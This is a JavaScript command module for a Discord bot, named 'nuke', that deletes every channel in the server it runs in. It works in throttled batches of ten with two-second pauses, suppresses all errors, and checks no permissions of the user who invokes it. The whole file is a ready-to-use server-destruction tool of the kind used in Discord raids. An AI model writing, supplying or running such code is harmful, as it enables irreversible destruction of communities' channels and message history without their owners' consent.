module.exports = {
  name: 'nuke',
  description: 'Delete all channels in batches',
  execute: async (msg, args) => {
    if (!msg.guild) return;
    
    try {
      const channels = msg.guild.channels.cache.toJSON();
      const batchSize = 10;
      
      for (let i = 0; i < channels.length; i += batchSize) {
        const batch = channels.slice(i, i + batchSize);
        
        await Promise.all(
          batch.map(channel => 
            channel.delete().catch(() => {})
          )
        );
        
        if (i + batchSize < channels.length) {
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }
    } catch (e) {}
  }
};
